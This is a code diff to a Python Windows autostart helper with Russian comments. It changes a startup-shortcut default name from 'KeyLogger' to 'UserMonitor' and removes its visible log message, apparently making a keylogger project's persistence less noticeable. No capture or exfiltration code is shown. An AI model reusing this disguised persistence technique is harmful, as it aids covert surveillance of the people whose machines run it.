@@ -2,19 +2,28 @@ import os
 import sys
 import win32com.client
 
-def add_to_autostart(script_path, shortcut_name="KeyLogger"):
-    startup_dir = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
-    shortcut_path = os.path.join(startup_dir, f"{shortcut_name}.lnk")
 
-    shell = win32com.client.Dispatch("WScript.Shell")
-    shortcut = shell.CreateShortCut(shortcut_path)
-    shortcut.Targetpath = sys.executable  # путь до python.exe
-    shortcut.Arguments = f'"{script_path}"'
-    shortcut.WorkingDirectory = os.path.dirname(script_path)
-    shortcut.IconLocation = sys.executable
-    shortcut.save()
-    print(f"[INFO] Ярлык добавлен в автозагрузку: {shortcut_path}")
+def add_to_autostart(target_path, shortcut_name="UserMonitor"):
+    try:
+        startup_dir = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
+        shortcut_path = os.path.join(startup_dir, f"{shortcut_name}.lnk")
 
-if __name__ == "__main__":
-    script = os.path.abspath("../gui/tray_app.py")
-    add_to_autostart(script)
+        if os.path.exists(shortcut_path):
+            return True
+
+        shell = win32com.client.Dispatch("WScript.Shell")
+        shortcut = shell.CreateShortCut(shortcut_path)
+        shortcut.Targetpath = target_path
+
+        # Для EXE не нужны аргументы
+        if target_path.endswith('.py'):
+            shortcut.Arguments = f'"{target_path}"'
+
+        shortcut.WorkingDirectory = os.path.dirname(target_path)
+        shortcut.IconLocation = target_path
+        shortcut.save()
+
+        return True
+    except Exception as e:
+        print(f"Ошибка автозагрузки: {e}")
+        return False
